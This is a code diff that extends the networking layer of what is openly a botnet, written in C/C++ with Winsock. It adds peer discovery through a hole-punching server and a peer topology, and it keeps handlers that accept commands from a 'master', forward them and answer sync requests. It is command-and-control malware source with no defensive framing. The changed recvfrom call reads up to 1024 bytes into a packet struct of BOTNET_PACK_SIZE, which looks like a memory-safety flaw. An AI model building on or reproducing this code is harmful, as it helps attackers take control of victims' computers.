@@ -1,8 +1,10 @@
 #include <malloc.h>
 #include <WS2tcpip.h>
 #pragma comment(lib, "ws2_32.lib")
+
 #include "network.h"
 #include "ipc_manage.h"
+#include "botnet.h"
 
 #define UDP_PORT 54000
 #define TCP_PORT 55000
@@ -11,7 +13,9 @@
 static SOCKET udp_sock;
 static SOCKET tcp_sock;
 static struct sockaddr_in master;
+static BotnetNode botnet_topology;
 
+/* init */
 /*
 * @purpose: Create basic sockets for communication operations.
 * @params: none.
@@ -49,6 +53,7 @@ void create_communication_sockets()
 	listen(tcp_sock, TCP_BACKLOG);
 }
 
+/* syncs */
 void sync_request()
 {
 	/* locals */
@@ -88,7 +93,36 @@ static void sync_reply(struct sockaddr_in client)
 	/* send packet */
 	sendto(udp_sock, (char*)&p, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, sizeof(client));
 }
+/* end syncs */
 
+/* P2P */
+/*
+* @purpose: ask the hole puncing server for a peer.
+* @params: socket used to send the request.
+* @return void.
+*
+*/
+void peer_request()
+{
+	/* locals */
+	struct botnet_pack pack;
+	static struct sockaddr_in server;
+
+	/* create request */
+	ZeroMemory(&pack, BOTNET_PACK_SIZE);
+	pack.type = PEER_REQUEST;
+
+	/* destination */
+	server.sin_family = AF_INET;
+	server.sin_port = htons(HOLE_PUNCHING_SERVER_PORT);
+	inet_pton(AF_INET, HOLE_PUNCHING_SERVER_IP, &server.sin_addr);
+
+	/* send request */
+	sendto(udp_sock, (char*)&pack, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&server, sizeof(server));
+}
+/* end P2P */
+
+/* handling incomings */
 static void handle_udp_connections()
 {
 	/* locals */
@@ -97,24 +131,27 @@ static void handle_udp_connections()
 	int client_size = sizeof(client);
 
 	/* recv packet */
-	recvfrom(udp_sock, (char*)&p, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, &client_size);
+	recvfrom(udp_sock, (char*)&p, 1024, 0, (struct sockaddr*)&client, &client_size);
 	
 	for (size_t i = 0; i < adapters_count; i++)
 		if (DEC_ADAPTER_IPS_ARR[i].hip == client.sin_addr.s_addr)
 			return;
-
+	
 	switch (p.type)
 	{
-	case COMMAND:
+	case PACK_TYPE::COMMAND:
 		master = client;
 		send_command((u_char*)&p, BOTNET_PACK_SIZE);
 		break;
-	case COMMAND_RESULT:
+	case PACK_TYPE::COMMAND_RESULT:
 		break;
-	case SYNC_REQUEST:
+	case PACK_TYPE::SYNC_REQUEST:
 		sync_reply(client);
 		break;
-	case SYNC_REPLY:
+	case PACK_TYPE::SYNC_REPLY:
+		break;
+	case PACK_TYPE::PEER_REPLY:
+		botnet_topology.addPeer(p.peer.ip, p.peer.port);
 		break;
 	}
 }
@@ -161,3 +198,4 @@ void handle_incomings()
 		}
 	}
 }
+/* end handling incomings */
